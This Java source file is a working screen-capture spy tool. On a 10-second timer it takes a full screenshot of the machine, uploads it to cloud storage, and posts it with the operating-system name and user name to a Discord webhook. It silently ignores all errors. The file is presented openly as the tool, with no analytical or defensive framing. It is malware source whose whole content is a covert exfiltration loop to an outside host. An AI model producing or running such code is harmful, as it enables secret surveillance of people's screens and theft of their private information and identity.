import storage.StorageCloud;
import webhook.DiscordWebhook;

import javax.imageio.ImageIO;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import static java.lang.System.out;

public class Main {
    public static void main(String[] args) throws Exception {
        Timer timer = new Timer();

        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                try{
                    var google = new StorageCloud();
                    var osName = System.getProperty("os.name");
                    var userName = System.getProperty("user.name");

                    Robot robot = new Robot();
                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                    BufferedImage screenshot = robot.createScreenCapture(screenRect);

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(screenshot, "png", baos);
                    byte[] imageBytes = baos.toByteArray();
                    var discord = new DiscordWebhook("YOUR_WEBHOOK_URL");
                    var imageUrl = google.save(imageBytes, osName
                            .concat(" ").concat(userName));
                    discord.setUsername(userName);
                    discord.setContent("Screenshot From device " + osName);
                    discord.addEmbed(new DiscordWebhook.EmbedObject()
                            .setTitle("Screenshot From device " +  osName + " of user " + userName)
                            .setDescription("At time " + new Date())
                            .setImage(imageUrl));

                    var response = discord.execute();

                    out.println(response);
                    out.println(System.getProperty("user.name"));
                } catch (Exception ignores) {}
            }
        };

        timer.scheduleAtFixedRate(task, 0, 10000);
    }
}
